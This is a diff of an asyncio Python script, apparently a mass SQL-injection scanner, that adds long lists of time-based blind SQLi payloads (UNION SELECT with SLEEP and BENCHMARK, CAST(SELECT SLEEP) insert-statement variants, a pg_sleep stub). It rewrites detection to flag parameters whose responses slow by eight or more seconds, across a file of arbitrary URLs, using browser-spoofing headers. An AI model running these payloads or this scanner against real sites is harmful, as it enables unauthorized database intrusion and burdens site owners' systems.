+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+""" UNION ALL SELECT @@VERSION,USER(),SLEEP(10),BENCHMARK(1000000,MD5('A')),NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL,NULL-- """,
+
+
+# my additions for insert statement SQLI 
+"""CAST((SELECT SLEEP(10)) AS CHAR)+1337""",
+
+""",CAST((SELECT SLEEP(10)) AS CHAR)+1337) -- """,
+"""',CAST((SELECT SLEEP(10)) AS CHAR)+1337) -- """,
+"""",CAST((SELECT SLEEP(10)) AS CHAR)+1337) -- """,
+
+""",CAST((SELECT SLEEP(10)) AS CHAR)+1337, NULL) -- """,
+"""',CAST((SELECT SLEEP(10)) AS CHAR)+1337, NULL) -- """,
+"""",CAST((SELECT SLEEP(10)) AS CHAR)+1337, NULL) -- """,
+""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL) -- """,
+"""',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL) -- """,
+"""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL) -- """,
+""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL) -- """,
+"""',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL) -- """,
+"""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL) -- """,
+""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL) -- """,
+"""',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL) -- """,
+"""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL) -- """,
+""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL) -- """,
+"""',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL) -- """,
+"""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL) -- """,
+""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL,NULL) -- """,
+"""',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL,NULL) -- """,
+"""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL,NULL) -- """,
+
+# same comm2 #
+
+""",CAST((SELECT SLEEP(10)) AS CHAR)+1337) # """,
+"""',CAST((SELECT SLEEP(10)) AS CHAR)+1337) # """,
+"""",CAST((SELECT SLEEP(10)) AS CHAR)+1337) # """,
+
+""",CAST((SELECT SLEEP(10)) AS CHAR)+1337, NULL) # """,
+"""',CAST((SELECT SLEEP(10)) AS CHAR)+1337, NULL) # """,
+"""",CAST((SELECT SLEEP(10)) AS CHAR)+1337, NULL) # """,
+""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL) # """,
+"""',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL) # """,
+"""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL) # """,
+""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL) # """,
+"""',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL) # """,
+"""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL) # """,
+""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL) # """,
+"""',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL) # """,
+"""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL) # """,
+""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL) # """,
+"""',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL) # """,
+"""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL) # """,
+""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL,NULL) # """,
+"""',CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL,NULL) # """,
+"""",CAST((SELECT SLEEP(10)) AS CHAR)+1337,NULL,NULL,NULL,NULL,NULL,NULL) # """,
+
+
+# same time based in insert statement but for postgreSQL
+
+"""(SELECT pg_sleep(10))""" # continue after having postgre setup to have clear payloads, or try online in sqlfiddle
+
 ]
 
-# Custom Chrome-like headers to evade basic bot detection
+# Custom Chrome-like headers
 HEADERS = {
     "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 "
                   "(KHTML, like Gecko) Chrome/115.0.0.0 Safari/537.36",
@@ -49,88 +342,76 @@ HEADERS = {
     "Upgrade-Insecure-Requests": "1"
 }
 
+lock = asyncio.Lock()  # global lock for file writes
+
 async def fetch(session, base_url, params):
     try:
-        # disable auto-decompression so len(raw) matches curl | wc -c
+        start = time.perf_counter()
         async with session.get(
             base_url,
             params=params,
             headers={k: v for k, v in HEADERS.items() if k.lower() != "accept-encoding"},
-            timeout=15,
+            timeout=30,
             compress=False
         ) as resp:
-            raw = await resp.content.read()  # raw bytes exactly as sent
-            text = raw.decode(errors="ignore")  # still usable for line/word counts
-            return {
-                'url': str(resp.url),
-                'status': resp.status,
-                'length': len(raw),  # matches curl without --compressed
-                'lines': text.count('\n'),
-                'words': len(text.split())
-            }
+            await resp.content.read()
+        end = time.perf_counter()
+        return {'url': str(resp.url), 'elapsed': end - start, 'status': resp.status}
     except Exception as e:
         return {'url': base_url, 'error': str(e)}
+
+async def test_param(session, base_url, key, original_val, params, results_file, normal_time):
+    """Test all payloads for a single param with per-payload logging."""
+    for payload in payloads:
+        mod = params.copy()
+        mod[key] = original_val + payload
+
+        # Log before testing payload
+        async with lock:
+            print(f"[TESTING] {base_url} param={key} payload={payload.strip()}", flush=True)
+
+        t1 = await fetch(session, base_url, mod)
+        if not t1 or 'elapsed' not in t1:
+            continue
+
+        if t1['elapsed'] - normal_time >= 8:  # single check only
+            async with lock:
+                with open(results_file, 'a') as rf:
+                    rf.write(f"[TIME SQLi] {base_url} param={key} payload={payload.strip()}\n"
+                             f"   normal={normal_time:.2f}s "
+                             f"delay={t1['elapsed']:.2f}s\n\n")
+                    rf.flush()
+                print(f"\n⚡ [TIME SQLi DETECTED] {base_url} param={key} "
+                      f"payload='{payload.strip()}' "
+                      f"({t1['elapsed']:.2f}s vs normal {normal_time:.2f}s)")
+            return True  # stop further payloads for this param
+
+    return False
+
 
 async def test_url(session, url, counter, total):
     parsed = urlparse(url)
     base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
     params = dict(parse_qsl(parsed.query, keep_blank_values=True))
-    tasks = []
 
-    # generate all payloaded URLs first
-    for payload_true, payload_false1, payload_false2 in payloads:
-        for key in list(params.keys()):
-            # TRUE payload
-            mod_true = params.copy()
-            mod_true[key] = mod_true[key] + payload_true
-            tasks.append(fetch(session, base_url, mod_true))
+    normal_res = await fetch(session, base_url, params)
+    if not normal_res or 'elapsed' not in normal_res:
+        print(f"[{counter}/{total}] {base_url} skipped (no response)")
+        return
+    normal_time = normal_res['elapsed']
 
-            # FALSE1 payload
-            mod_false1 = params.copy()
-            mod_false1[key] = mod_false1[key] + payload_false1
-            tasks.append(fetch(session, base_url, mod_false1))
-
-            # FALSE2 payload
-            mod_false2 = params.copy()
-            mod_false2[key] = mod_false2[key] + payload_false2
-            tasks.append(fetch(session, base_url, mod_false2))
-
-            print(f"[{counter}/{total}] Testing param '{key}' on {base_url}", end='\r', flush=True)
-
+    # Test all params concurrently
+    tasks = [
+        test_param(session, base_url, key, val, params, results_file, normal_time)
+        for key, val in params.items()
+    ]
     results = await asyncio.gather(*tasks)
 
-    # process results 3-way
-    with open(results_file, 'a') as rf:
-        for j in range(0, len(results), 3):
-            true_res = results[j]
-            false1_res = results[j+1]
-            false2_res = results[j+2]
-
-            # skip errors
-            if 'error' in true_res or 'error' in false1_res or 'error' in false2_res:
-                continue
-
-            # only compare if false1 ≈ false2
-            static_length = false1_res['length'] == false2_res['length']
-            static_lines = false1_res['lines'] == false2_res['lines']
-            static_words = false1_res['words'] == false2_res['words']
-            static_status = false1_res['status'] == false2_res['status']
-
-            diffs = []
-            if static_length and true_res['length'] != false1_res['length']:
-                diffs.append(f"size: {true_res['length']} vs {false1_res['length']}")
-            if static_lines and true_res['lines'] != false1_res['lines']:
-                diffs.append(f"lines: {true_res['lines']} vs {false1_res['lines']}")
-            if static_words and true_res['words'] != false1_res['words']:
-                diffs.append(f"words: {true_res['words']} vs {false1_res['words']}")
-            if static_status and true_res['status'] != false1_res['status']:
-                diffs.append(f"status: {true_res['status']} vs {false1_res['status']}")
-
-            if diffs:
-                rf.write(f"[POSSIBLE SQLi] {true_res['url']}\n   Differences: {', '.join(diffs)}\n\n")
-
-    print(f"[{counter}/{total}] done", end='\r', flush=True)
-
+    # If any param returned True (vulnerable), stop testing other params
+    if any(results):
+        print(f"[{counter}/{total}] {base_url} found SQLi, skipping remaining params")
+    else:
+        print(f"[{counter}/{total}] {base_url} done", end='\r', flush=True)
 
 async def main():
     with open(urls_file) as f:
@@ -144,6 +425,7 @@ async def main():
         for u in urls:
             await test_url(session, u, counter, total)
             counter += 1
+
     print(f"\nAll {total} URLs processed. Results saved in {results_file}")
 
 if __name__ == "__main__":
